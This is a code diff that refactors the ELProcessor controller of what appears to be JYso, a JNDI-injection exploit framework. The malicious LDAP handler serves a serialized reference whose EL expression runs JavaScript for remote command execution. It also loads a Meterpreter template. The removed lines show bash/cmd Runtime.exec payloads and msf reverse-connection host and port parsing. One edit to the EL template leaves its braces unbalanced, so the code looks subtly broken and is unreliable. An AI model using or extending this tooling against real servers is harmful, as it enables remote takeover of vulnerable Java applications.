@@ -1,10 +1,7 @@
 package com.qi4l.JYso.controllers;
 
-import com.qi4l.JYso.enumtypes.GadgetType;
 import com.qi4l.JYso.exceptions.IncorrectParamsException;
 import com.qi4l.JYso.exceptions.UnSupportedPayloadTypeException;
-import com.qi4l.JYso.gadgets.Config.Config;
-import com.qi4l.JYso.gadgets.URLDNS;
 import com.qi4l.JYso.gadgets.utils.Gadgets;
 import com.qi4l.JYso.gadgets.utils.InjShell;
 import com.qi4l.JYso.gadgets.utils.Utils;
@@ -14,30 +11,23 @@ import com.unboundid.ldap.sdk.Entry;
 import com.unboundid.ldap.sdk.LDAPResult;
 import com.unboundid.ldap.sdk.ResultCode;
 import org.apache.naming.ResourceRef;
-import org.fusesource.jansi.Ansi;
 import org.apache.logging.log4j.Logger;
 import org.apache.logging.log4j.LogManager;
 
 import javax.naming.StringRefAddr;
 import java.lang.reflect.Field;
-import java.util.Locale;
 
-import static com.qi4l.JYso.controllers.BasicController.getStringQ;
-
-
+@SuppressWarnings("unused")
 @LdapMapping(uri = {"/elprocessor"})
-public class ELProcessorController implements LdapController {
-    private static final String SCRIPT_TEMPLATE = "{\"\".getClass().forName(\"javax.script.ScriptEngineManager\")"
+public class ELProcessorController extends BaseLdapController {
+    private static final String SCRIPT_TEMPLATE = "{\"\"}.getClass().forName(\"javax.script.ScriptEngineManager\")"
             + ".newInstance().getEngineByName(\"JavaScript\")"
             + ".eval(\"%s\")}";
     private static final Logger log = LogManager.getLogger(ELProcessorController.class);
 
     private String payloadType;
-    // 记录解析请求时提取出的命令参数或回连信息。
     private String[] params = new String[0];
-    private GadgetType gadgetType;
 
-    // 向 LDAP 客户端返回序列化后的 ELProcessor 引用。
     @Override
     public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
         try {
@@ -59,34 +49,19 @@ public class ELProcessorController implements LdapController {
             entry.addAttribute("javaSerializedData", Utils.serialize(ref));
             result.sendSearchEntry(entry);
             result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
-        } catch (Throwable er) {
+        } catch (Exception er) {
             System.err.println("Error while generating or serializing payload");
-            log.error(String.valueOf(er));
+            log.error("Error while generating or serializing payload", er);
         }
     }
 
-    // 解析请求路径，确定 payload 类型及其所需参数。
     @Override
     public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
-        System.out.println("- JNDI LDAP Local Reference Links + ELProcessor");
-        try {
-            String normalized = base.replace('\\', '/');
-            payloadType = segment(normalized, 1);
-            if (payloadType.isEmpty()) {
-                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + normalized);
-            }
-            System.out.println(Ansi.ansi().fgBrightMagenta().a("  Payload: " + payloadType).reset());
-
-            gadgetType = parseGadgetType(normalized);
-            params = resolveParams(normalized);
-        } catch (Exception e) {
-            if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;
-
-            throw new IncorrectParamsException("Incorrect params: " + base);
-        }
+        ParseResult result = parseBase(base, "- JNDI LDAP Local Reference Links + ELProcessor");
+        payloadType = result.payloadType;
+        params = result.params;
     }
 
-    // 构造注入到 ELProcessor 中的 JavaScript 代码。
     private String buildPayloadScript() throws Exception {
         TomcatBypassHelper helper = new TomcatBypassHelper();
         String scriptBody;
@@ -107,56 +82,6 @@ public class ELProcessorController implements LdapController {
         return SCRIPT_TEMPLATE.replace("%s", scriptBody.replace("\"", "\\\""));
     }
 
-    // 解析路径中的 gadget 片段并转换为枚举。
-    private GadgetType parseGadgetType(String base) throws UnSupportedPayloadTypeException {
-        String segment = segment(base, 2);
-        if (segment.isEmpty()) return null;
-
-        try {
-            return GadgetType.valueOf(segment.toLowerCase(Locale.ROOT));
-        } catch (IllegalArgumentException ignored) {
-            throw new UnSupportedPayloadTypeException("UnSupportedPayloadType : " + segment);
-        }
-    }
-
-    // 根据不同 gadget 类型构建命令参数或回连配置。
-    private String[] resolveParams(String base) throws Exception {
-        if (gadgetType == null) return new String[0];
-
-        switch (gadgetType) {
-            case base64:
-                String cmd = Utils.getCmdFromBase(base);
-                System.out.println(Ansi.ansi().fgBrightRed().a("  Command: " + cmd).reset());
-                return new String[]{cmd};
-            case shell:
-                String encoded = Utils.getCmdFromBase(base);
-                String decoded = Utils.base64Decode(encoded);
-                System.out.println(Ansi.ansi().fgBrightRed().a("  Command: " + decoded).reset());
-                return decoded.split(" ");
-            case msf:
-                String[] results = Utils.getIPAndPortFromBase(base);
-                Config.rhost = results[0];
-                Config.rport = results[1];
-                System.out.println("[+] RemoteHost: " + results[0]);
-                System.out.println("[+] RemotePort: " + results[1]);
-                return results;
-            default:
-                return new String[0];
-        }
-    }
-
-    // 提取路径中的第 index 个非空段，保持与原有解析方式一致。
-    private String segment(String base, int index) {
-        return getStringQ(base, index);
-    }
-
-    // 返回连字符后的子串，用于解析自定义类名。
-    private String suffixAfterDash(String value) {
-        int dashIndex = value.indexOf('-');
-        return dashIndex >= 0 ? value.substring(dashIndex + 1) : value;
-    }
-
-    // 封装 Tomcat 环境下 ELProcessor 的注入辅助逻辑，保持主控制器简洁。
     private class TomcatBypassHelper {
         String injectInterpreter() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
             Class<?> clazz = Class.forName("com.qi4l.JYso.template.com.qi4l.JYso.template.Meterpreter");
@@ -171,17 +96,7 @@ public class ELProcessorController implements LdapController {
         }
 
         String getExecCode(String cmd) {
-            return "var str_s=new Array(3);\n"
-                    + "        if(java.io.File.separator.equals('/')){\n"
-                    + "            str_s[0]='/bin/bash';\n"
-                    + "            str_s[1]='-c';\n"
-                    + "            str_s[2]='" + cmd + "';\n"
-                    + "        }else{\n"
-                    + "            str_s[0]='cmd';\n"
-                    + "            str_s[1]='/C';\n"
-                    + "            str_s[2]='" + cmd + "';\n"
-                    + "        }\n"
-                    + "        java.lang.Runtime.getRuntime().exec(str_s);";
+            return BaseLdapController.getExecCode(cmd);
         }
     }
 }
